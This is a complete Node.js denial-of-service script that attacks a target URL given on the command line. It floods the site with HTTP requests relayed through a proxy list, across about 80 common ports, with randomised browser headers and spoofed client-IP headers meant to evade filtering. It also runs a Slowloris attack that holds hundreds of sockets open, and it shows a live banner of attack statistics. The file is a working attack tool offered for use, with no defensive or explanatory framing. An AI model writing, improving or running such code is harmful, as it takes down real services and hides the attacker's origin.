const https = require('https');
const http = require('http');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');
const net = require('net');

const TARGET_URL = process.argv[2];
const PROXY_FILE = 'proxy.txt';
const THREADS = 500;
const REQUEST_DELAY = 10;
const MAX_MEMORY_PERCENT = 80;
const MEMORY_CHECK_INTERVAL = 5000;
const THREAD_REDUCTION_FACTOR = 0.5;

const COMMON_PORTS = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 2082, 2083, 2086, 2087, 2095, 2096, 2222, 2483, 2484, 3306, 3389, 4333, 4848, 5432, 5500, 5800, 5900, 5984, 6082, 6379, 7001, 7002, 7777, 8000, 8001, 8006, 8008, 8009, 8010, 8042, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8091, 8181, 8443, 8444, 8880, 8881, 8888, 9000, 9001, 9042, 9090, 9200, 9300, 9999, 10000, 11211, 27017, 28017, 50000, 50030, 50060, 50070, 50075, 50090];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Android 14; Mobile; LG-M700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'curl/7.68.0'
];

const ACCEPT_LANGUAGES = ['en-US,en;q=0.9', 'pt-BR,pt;q=0.9,en;q=0.8', 'es-ES,es;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'ru-RU,ru;q=0.9'];
const ACCEPT_ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate', 'identity', '*'];
const CACHE_CONTROLS = ['no-cache', 'max-age=0', 'no-store', 'no-cache, no-store, must-revalidate'];
const REFERRERS = ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/', 'https://www.yahoo.com/', 'https://www.facebook.com/'];
const ACCEPT_TYPES = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'application/json, text/plain, */*', '*/*'];
const HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS'];

const SLOWLORIS_SOCKETS = [];
const MAX_SLOW_SOCKETS = 200;
const SLOWLORIS_INTERVAL = 15000;

const HEADER_VARIATIONS = [
    { 'X-Forwarded-For': () => { const octets = []; for(let i=0;i<4;i++) octets.push(Math.floor(Math.random()*256)); return octets.join('.'); }},
    { 'X-Real-IP': () => { const octets = []; for(let i=0;i<4;i++) octets.push(Math.floor(Math.random()*256)); return octets.join('.'); }},
    { 'CF-Connecting-IP': () => { const octets = []; for(let i=0;i<4;i++) octets.push(Math.floor(Math.random()*256)); return octets.join('.'); }},
    { 'X-Client-IP': () => { const octets = []; for(let i=0;i<4;i++) octets.push(Math.floor(Math.random()*256)); return octets.join('.'); }}
];

let proxyList = [];
let activeThreads = THREADS;
let activeIntervals = [];
let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let statusCodes = {};
let startTime = Date.now();
let portIndex = 0;

try {
    const data = fs.readFileSync(PROXY_FILE, 'utf8');
    proxyList = data.split('\n').filter(line => line.trim() !== '');
    if (proxyList.length === 0) {
        console.log('Empty proxy file.');
        process.exit(1);
    }
} catch (err) {
    console.log('Failed to read proxy file: ' + err.message);
    process.exit(1);
}

function getRandomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomProxy() {
    const randomIndex = Math.floor(Math.random() * proxyList.length);
    const proxyString = proxyList[randomIndex];
    const parts = proxyString.split(':');
    if (parts.length < 2) return null;
    return { host: parts[0], port: parseInt(parts[1]) };
}

function getNextPort() {
    const port = COMMON_PORTS[portIndex % COMMON_PORTS.length];
    portIndex++;
    return port;
}

function generateRandomHeaders() {
    const headers = {
        'User-Agent': getRandomItem(USER_AGENTS),
        'Accept': getRandomItem(ACCEPT_TYPES),
        'Accept-Language': getRandomItem(ACCEPT_LANGUAGES),
        'Accept-Encoding': getRandomItem(ACCEPT_ENCODINGS),
        'Cache-Control': getRandomItem(CACHE_CONTROLS),
        'Referer': getRandomItem(REFERRERS),
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'Connection': Math.random() > 0.3 ? 'keep-alive' : 'close'
    };
    const numExtraHeaders = Math.floor(Math.random() * 2) + 1;
    for (let i = 0; i < numExtraHeaders; i++) {
        const headerVariation = getRandomItem(HEADER_VARIATIONS);
        const headerKey = Object.keys(headerVariation)[0];
        if (!headers[headerKey]) {
            headers[headerKey] = headerVariation[headerKey]();
        }
    }
    return headers;
}

function buildRequestString(hostname, port, path) {
    const method = getRandomItem(HTTP_METHODS);
    const headers = generateRandomHeaders();
    let requestString = `${method} ${path} HTTP/1.1\r\n`;
    requestString += `Host: ${hostname}\r\n`;
    for (const [key, value] of Object.entries(headers)) {
        requestString += `${key}: ${value}\r\n`;
    }
    requestString += '\r\n';
    if (method === 'POST') {
        const postData = crypto.randomBytes(Math.floor(Math.random() * 500) + 50).toString('hex');
        requestString += postData;
        requestString += '\r\n';
    }
    return requestString;
}

function slowlorisAttack(hostname, port) {
    if (SLOWLORIS_SOCKETS.length >= MAX_SLOW_SOCKETS) return;
    const socket = new net.Socket();
    socket.setTimeout(120000);
    socket.connect(port, hostname, () => {
        const headers = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${getRandomItem(USER_AGENTS)}\r\nConnection: keep-alive\r\nAccept: */*\r\n`;
        socket.write(headers);
        SLOWLORIS_SOCKETS.push(socket);
    });
    socket.on('error', () => {
        const index = SLOWLORIS_SOCKETS.indexOf(socket);
        if (index > -1) SLOWLORIS_SOCKETS.splice(index, 1);
    });
    socket.on('timeout', () => {
        socket.write(`X-Keep-Alive: ${crypto.randomBytes(16).toString('hex')}\r\n`);
    });
}

function maintainSlowloris(hostname) {
    setInterval(() => {
        while (SLOWLORIS_SOCKETS.length < MAX_SLOW_SOCKETS) {
            const port = getNextPort();
            slowlorisAttack(hostname, port);
        }
        SLOWLORIS_SOCKETS.forEach(socket => {
            socket.write(`X-Keep-Alive: ${crypto.randomBytes(8).toString('hex')}\r\n`);
        });
    }, SLOWLORIS_INTERVAL);
}

function displayBanner() {
    console.clear();
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(totalRequests / elapsed) : 0;
    console.log('============================================================');
    console.log('  TARGET: ' + TARGET_URL);
    console.log('  ATTACK MODE: MULTI-PORT + SLOWLORIS');
    console.log('============================================================');
    console.log('  TOTAL REQUESTS:  ' + totalRequests);
    console.log('  SUCCESS (2xx):   ' + successCount);
    console.log('  ERRORS:          ' + errorCount);
    console.log('  ACTIVE THREADS:  ' + activeThreads);
    console.log('  PROXIES LOADED:  ' + proxyList.length);
    console.log('  SLOW SOCKETS:    ' + SLOWLORIS_SOCKETS.length);
    console.log('  PORTS TARGETED:  ' + portIndex);
    console.log('  REQUESTS/SEC:    ' + rps);
    console.log('  ELAPSED TIME:    ' + elapsed + 's');
    console.log('------------------------------------------------------------');
    console.log('  STATUS CODES:');
    for (const code in statusCodes) {
        const barLength = Math.floor((statusCodes[code] / Math.max(totalRequests, 1)) * 30) || 0;
        const bar = '#'.repeat(barLength);
        console.log('  ' + code + ' : ' + statusCodes[code] + ' ' + bar);
    }
    console.log('============================================================');
}

function httpFlood(proxy) {
    const target = url.parse(TARGET_URL);
    const targetHostname = target.hostname;
    const targetPort = getNextPort();
    const path = '/' + crypto.randomBytes(2).toString('hex');
    const requestString = buildRequestString(targetHostname, targetPort, path);
    const useHttps = target.protocol === 'https:';
    const proxyOptions = {
        hostname: proxy.host,
        port: proxy.port,
        method: 'CONNECT',
        path: targetHostname + ':' + targetPort,
        timeout: 5000
    };
    const req = http.request(proxyOptions);
    req.on('connect', (res, socket) => {
        socket.write(requestString);
        socket.on('data', (data) => {
            const response = data.toString();
            const statusMatch = response.match(/HTTP\/1\.\d (\d{3})/);
            if (statusMatch) {
                const statusCode = statusMatch[1];
                statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
                if (statusCode.startsWith('2') || statusCode.startsWith('3')) {
                    successCount++;
                } else {
                    errorCount++;
                }
            }
            totalRequests++;
            displayBanner();
            socket.end();
        });
        socket.on('error', () => {
            errorCount++;
            totalRequests++;
            statusCodes['SOCKET_ERR'] = (statusCodes['SOCKET_ERR'] || 0) + 1;
            displayBanner();
        });
    });
    req.on('error', () => {
        errorCount++;
        totalRequests++;
        statusCodes['PROXY_ERR'] = (statusCodes['PROXY_ERR'] || 0) + 1;
        displayBanner();
    });
    req.on('timeout', () => {
        req.destroy();
        errorCount++;
        totalRequests++;
        statusCodes['TIMEOUT'] = (statusCodes['TIMEOUT'] || 0) + 1;
        displayBanner();
    });
    req.end();
}

function startThread() {
    const proxy = getRandomProxy();
    if (!proxy) return;
    const intervalId = setInterval(() => {
        httpFlood(proxy);
    }, REQUEST_DELAY);
    activeIntervals.push(intervalId);
}

function reduceThreads() {
    const targetThreads = Math.floor(activeThreads * THREAD_REDUCTION_FACTOR);
    if (targetThreads < 10) return;
    const threadsToRemove = activeThreads - targetThreads;
    for (let i = 0; i < threadsToRemove; i++) {
        const intervalId = activeIntervals.pop();
        if (intervalId) {
            clearInterval(intervalId);
        }
    }
    activeThreads = targetThreads;
}

function checkMemory() {
    const memoryUsage = process.memoryUsage();
    const heapUsed = memoryUsage.heapUsed;
    const heapTotal = memoryUsage.heapTotal;
    const memoryPercent = (heapUsed / heapTotal) * 100;
    if (memoryPercent > MAX_MEMORY_PERCENT) {
        reduceThreads();
    }
}

const targetParsed = url.parse(TARGET_URL);
const hostname = targetParsed.hostname;

displayBanner();
maintainSlowloris(hostname);

for (let i = 0; i < THREADS; i++) {
    setTimeout(() => {
        startThread();
    }, i * 10);
}

setInterval(() => {
    checkMemory();
}, MEMORY_CHECK_INTERVAL);